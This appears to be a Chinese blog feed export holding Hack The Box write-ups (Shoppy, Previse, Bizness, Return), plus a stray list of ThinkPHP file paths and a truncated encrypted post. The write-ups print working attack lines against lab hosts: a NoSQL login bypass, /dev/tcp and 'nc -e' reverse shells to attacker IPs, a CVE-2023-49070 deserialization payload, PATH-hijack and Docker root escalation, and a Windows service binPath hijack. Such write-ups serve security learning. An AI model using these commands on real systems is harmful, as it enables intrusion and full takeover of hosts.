<p><a class="link"   href="https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo" >https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>是通过什么判断为Nosql注入的呢？（参考思路：<a class="link"   href="https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed" >https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed<i class="fas fa-external-link-alt"></i></a> ）</p>
<p>login发包是post发送username和password两个参数，按往常那样测试单引号，每次都需等待很久的时间然后返回504，直接sqlmap跑也无效，当我们随便访问一个不存在的目录时返回的是，这表明这个web在使用路由</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913140659.png" ></p>
<p>所以可能是在使用Node.js，他存在使用Nosql注入漏洞绕过登陆限制，经过尝试，可以使用<code>admin&#39; || &#39;a&#39;==&#39;a</code>绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141054.png" ></p>
<p>登陆后跳转到&#x2F;admin，主要是有个search功能点，没找到别的点了，搜索admin，给了一个json文件，里面有admin密码的哈希（爆破不出来）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141517.png" ></p>
<p>但是不知道有没有别的用户，继续使用Nosql的payload<code>admin&#39; || &#39;a&#39;==&#39;a</code>，这次多看到一个用户的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141635.png" ></p>
<p>爆破后拿到账号密码<code>josh:remembermethisway</code>，成功登陆mattermost那个域名的登陆口，在聊天窗口中找到jaeger的账号密码，ssh登陆成功，拿到user</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141843.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l看到 <code>(deploy) /home/deploy/password-manager</code>,password-manager是个二进制文件，strings查看，貌似是输入正确的密码后能拿到deploy目录下的creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142207.png" ></p>
<p>传到本地，ida看了一下，密码就在源代码里，<code>Sample</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142251.png" ></p>
<p>输入正确密码后拿到deploy的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142327.png" ></p>
<p>登陆deploy输入id，发现deploy在docker组里，有相关的提权方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy@shoppy:/home/jaeger$ id</span><br><span class="line">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker提权参考链接</p>
<p><a class="link"   href="https://www.cnblogs.com/kqdssheng/p/18275541" >https://www.cnblogs.com/kqdssheng/p/18275541<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142636.png" ></p>
<p>有个docker提权的漏洞，大概思路就是<strong>创建一个新的容器，该容器中挂载了整个文件系统。在这个容器中，我将是根用户，因此可以完全访问容器中的所有文件（包括完整的主机文件系统）。</strong></p>
<p>​	•	docker run: 运行一个新的 Docker 容器。</p>
<p>​	•	-v &#x2F;:&#x2F;mnt: 将宿主机的根目录 &#x2F; 挂载到容器内部的 &#x2F;mnt 目录。这样，容器可以通过 &#x2F;mnt 访问到宿主机的文件系统。</p>
<p>​	•	–rm: 容器在退出后会自动删除，不会保留临时文件或容器。</p>
<p>​	•	-it: 以交互模式运行容器，并分配一个伪终端。这样你可以在容器中运行命令并看到输出。</p>
<p>​	•	alpine: 指定使用 Alpine Linux 这个小型的 Linux 发行版镜像作为容器的基础镜像。</p>
<p>​	•	chroot &#x2F;mnt: 使用 chroot 命令将 &#x2F;mnt 作为新的根目录，将容器的根文件系统切换到宿主机的根目录。</p>
<p>​	•	bash: 运行 bash，给你一个新的 shell 环境。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913143024.png" ></p>
<p>于是我们可以成功读到root.txt，后续也可以通过读取shadow或是ssh私钥等方法来获得真正的宿主机root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，主要涉及到Nosql注入和docker提权，都是第一次遇见，过后要好好消化一下这两个知识了。。</p>
<h5 id="推荐阅读wp"><a href="#推荐阅读wp" class="headerlink" title="推荐阅读wp"></a>推荐阅读wp</h5><p><a class="link"   href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm" >https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb previse复盘</title>
    <url>/2024/09/13/htb-previse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>

<p>只有22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>先访问80端口，只有一个登陆口，尝试了密码爆破和sql注入，都不成功，后面看的官方对机器的描述是关于重定向的，扫到的nav.php，点到其他php都会定向会login.php。看一下bp历史包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
<p>可以看到返回包里有accounts.php的详细内容，但是状态码是302，我们尝试bp抓包后”Do interact”，修改返回包的状态码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
<p>这下就不会被重定向到login.php，可以看到正常的account页面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
<p>我们在这里新建一个用户，再正常登陆，登陆后就不会被重定向了</p>
<p>然后再download.php找到一个可以下载的压缩包<code>SITEBACKUP.zip</code>，下载下来是网站的源码，config.php可以看到mysql登陆账号密码，后面可以用，经过一番搜寻，在logs.php里面发现<code>exec</code>函数，里面的变量可控，大概率存在代码注入漏洞</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
<p>找到导出log的php，抓到包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
<p>改变一下delim变量值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到第一反应是先登陆mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$🧂llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>

<p>拿到 <code>m4lwhere</code>的加盐密码，还要看到他是什么类型的哈希</p>
<p>然后在accounts.php源码找到存储逻辑</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
<p>Crypt()函数，md5加密来的，于是指定john的爆破格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<p>最后拿到密码<code>ilovecody112235!</code>登陆m4lwhere</p>
<p>第一件事sudo -l，找到一个可以用的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>

<p>没有修改权限，第一反应是修改环境变量，里面用到gzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>真感觉htb质量高，难度适中，什么知识点都需要，最开始重定向分析那个算是基础，这次复盘下来也是加深了印象，拿到源码后审计这块真需要耐心。。。</p>
<p>\server\index.php<br>\server\simplewind\Core\ThinkPHP.php<br>\server\simplewind\Core\Library\Think\Think.class.php<br>\server\simplewind\Core\Library\Think\Storage.class.php<br>\server\simplewind\Core\Library\Think\Storage\Driver\File.class.php<br>\server\simplewind\Core\Mode\common.php<br>\server\simplewind\Core\Common\functions.php<br>\server\application\Common\Common\function.php<br>\server\simplewind\Core\Library\Think\Hook.class.php<br>\server\simplewind\Core\Library\Think\App.class.php<br>\server\simplewind\Core\Library\Think\Dispatcher.class.php<br>\server\simplewind\Core\Library\Think\Route.class.php<br>\server\simplewind\Core\Library\Think\Controller.class.php<br>\server\simplewind\Core\Library\Think\View.class.php<br>\server\simplewind\Core\Library\Behavior\BuildLiteBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ParseTemplateBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ContentReplaceBehavior.class.php<br>\server\simplewind\Core\Conf\convention.php<br>\server\application\Common\Conf\config.php<br>\server\data\conf\db.php<br>\server\data\conf\config.php<br>\server\data\conf\route.php<br>\server\application\Common\Conf\alias.php<br>\server\application\Common\Conf\tags.php<br>\server\simplewind\Core\Lang\zh-cn.php<br>\server\simplewind\Core\Conf\debug.php<br>\server\application\Common\Conf\debug.php<br>\server\application\Common\Behavior\InitHookBehavior.class.php<br>\server\simplewind\Core\Library\Think\Behavior.class.php<br>\server\simplewind\Core\Library\Think\Cache.class.php<br>\server\simplewind\Core\Library\Think\Cache\Driver\File.class.php<br>\server\application\Common\Common\extend.php<br>\server\application\Portal\Conf\config.php<br>\server\application\Portal\Common\function.php<br>\server\simplewind\Core\Library\Behavior\ReadHtmlCacheBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\CheckLangBehavior.class.php<br>\server\application\Common\Lang\zh-cn.php<br>\server\application\Portal\Controller\IndexController.class.php<br>\server\application\Common\Controller\HomebaseController.class.php<br>\server\application\Common\Controller\AppframeController.class.php<br>\server\simplewind\Core\Library\Think\Template.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib\Cx.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib.class.php<br>\server\application\Common\Lib\Taglib\TagLibSpadmin.class.php<br>\server\application\Common\Lib\Taglib\TagLibHome.class.php<br>\server\application\Portal\Lib\Taglib\Portal.class.php<br>\server\data\runtime\Cache\Portal\5c2fc9f3dd331fb0470c86f0c6552505.php<br>\server\simplewind\Core\Library\Think\Model.class.php<br>\server\simplewind\Core\Library\Think\Db.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver\Mysql.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver.class.php<br>\server\simplewind\Lib\Util\Tree.class.php<br>\server\simplewind\Core\Library\Behavior\WriteHtmlCacheBehavior.class.php<br>\server\application\Common\Behavior\TmplStripSpaceBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ShowPageTraceBehavior.class.php</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb bizness复盘</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.252</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
<p>先下载ysoserial.jar生成base64的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>然后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>成功拿到第一个shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>使用hashid识别一下加密类型</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>猜测是120模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>爆出来的密码是monkeybizness</p>
<p>然后直接su - root登录，权限就到root了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb return复盘</title>
    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>这个靶机比较简单，就边做边记录了📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：我觉得比easy还easy</p>
<p>ip：10.10.11.108</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >

<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-permX复盘</title>
    <url>/2024/07/10/htb-permX%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa3894042594a3ebe558c2ad9a7c5517219b41d985abec3337968f8e2cbdb1c4">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c2c52a8e84a8dc712b774910901007a365eb4004cf609da05288b803cdfdc92a92d2430b3d430b28dfe6f17ba6ea9a877f4bc3eb176aed7a490b11ec95b70dbd7db96a21b2212264a48ce4373ed629dd6b9cb0aac74a661389af0cb49589b9a4e1d4578f403540fe11e13bb8bc2d6442a57395b3b0d3fd234be6724ff1706e6eb1daf00e5cc6e0e0a2e51b044d286b9db4f9ede6b474136fe01aa1c0065ea57510635317e0417006c5308c687b7bc3a16242202efda3e3d72943ffe0d37ba9ba9dad0922d4ad1494c0de51ea5aa0bcce739dc50919227a06454506c3d1af9a5cf3389fd5eb625418044b7a9a47128ea61849cb24a75c2bbe207dcf8e2d1809ca6394ca6c338f2246f0095fff8bc7e378c60e6cf641bed69149f23c7d7268e1ed513c9f77593dde36464bda24ae9d4fbf11347ab3156171f1416a6d9e62adb5f9469bd1dfe512d0b6cb587436efa98d50c52a8794a6452a3471cb8a05421f5b595616cf946fca726ca41ebee269b8622bfcfb015c638a66aa86d6802704b703fb522a49659ebc7096b2ea5b1abc5c96b6b104c3685420dacfa6bdc75bc0304b8b0a977c6309